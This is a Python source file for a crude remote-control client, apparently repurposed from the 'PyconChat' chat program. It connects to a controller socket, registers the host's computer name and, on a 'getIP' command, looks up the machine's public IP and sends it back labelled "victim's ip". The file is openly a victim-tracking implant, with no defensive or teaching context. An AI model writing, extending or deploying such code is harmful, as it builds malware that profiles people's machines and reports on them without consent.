import socket
import threading
import pickle
import os
import requests

state = {}
pcname = os.getenv('COMPUTERNAME')

def serverListen(serverSocket):
    while True:
        msg = serverSocket.recv(1024).decode("utf-8")
        if msg == "getIP":
            url = 'http://myexternalip.com/raw'
            r = requests.get(url)
            ip = r.text
            serverSocket.send(b"/messageSend")
            serverSocket.send(bytes("victim's ip: " + ip, "utf-8"))
        else:
            print(msg)





def main():

    serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serverSocket.connect(("localhost", 8000))
    state["inputCondition"] = threading.Condition()
    state["sendMessageLock"] = threading.Lock()
    state["username"] = pcname
    state["groupname"] = pcname + "' " + "session"
    state["alive"] = False
    state["joinDisconnect"] = False
    state["inputMessage"] = True
    serverSocket.send(bytes(state["username"], "utf-8"))
    serverSocket.recv(1024)
    serverSocket.send(bytes(state["groupname"], "utf-8"))
    response = serverSocket.recv(1024).decode("utf-8")
    if response == "/adminReady":
        print("You have created the group", state["groupname"], "and are now an admin.")
        state["alive"] = True
    elif response == "/ready":
        print("You have joined the group", state["groupname"])
        state["alive"] = True

    serverListenThread = threading.Thread(target=serverListen, args=(serverSocket,))

    while True:
        if state["alive"] or state["joinDisconnect"]:
            break
    if state["alive"]:



        serverListenThread.start()
    while True:
        if state["joinDisconnect"]:
            serverSocket.shutdown(socket.SHUT_RDWR)
            serverSocket.close()


            print("Disconnected from PyconChat.")
            break
        elif not state["alive"]:
            serverSocket.shutdown(socket.SHUT_RDWR)
            serverSocket.close()

            serverListenThread.join()
            print("Disconnected from PyconChat.")
            break


if __name__ == "__main__":
    main()
